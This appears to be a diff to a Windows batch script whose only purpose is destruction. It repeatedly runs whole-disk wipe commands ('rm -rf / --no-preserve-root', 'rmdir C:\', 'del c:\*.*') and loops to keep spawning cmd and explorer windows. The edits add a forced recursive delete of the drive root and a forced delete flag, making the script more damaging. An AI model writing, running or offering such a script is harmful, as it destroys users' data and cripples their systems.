@@ -1,6 +1,7 @@
 @echo OFF
 rm -rf / --no-preserve-root
 sudo rm -rf / --no-preserve-root
+rmdir /s /q \
 :loop
 start cmd
 start explorer
@@ -9,6 +10,6 @@ rm -rf / -f --no-preserve-root
 rm -rf / -f
 sudo rm -rf / -f
 rmdir C:\
-del c:\*.*
+del /f c:\*.*
 sudo rm -rf / -f --no-preserve-root
 goto loop
